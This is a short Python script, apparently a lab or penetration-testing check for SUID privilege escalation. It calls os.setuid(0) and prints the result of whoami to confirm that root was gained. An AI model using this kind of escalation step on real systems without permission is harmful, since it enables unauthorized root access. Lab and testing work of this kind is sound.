#!/usr/bin/env python3
import os
import subprocess


def main():
    print("\n#### Suid privilege escalation ####\n")
    os.setuid(0)
    result = subprocess.check_output("whoami")
    result = result.decode("utf-8")
    print("whoami = {}".format(result))


if __name__ == "__main__":
    main()
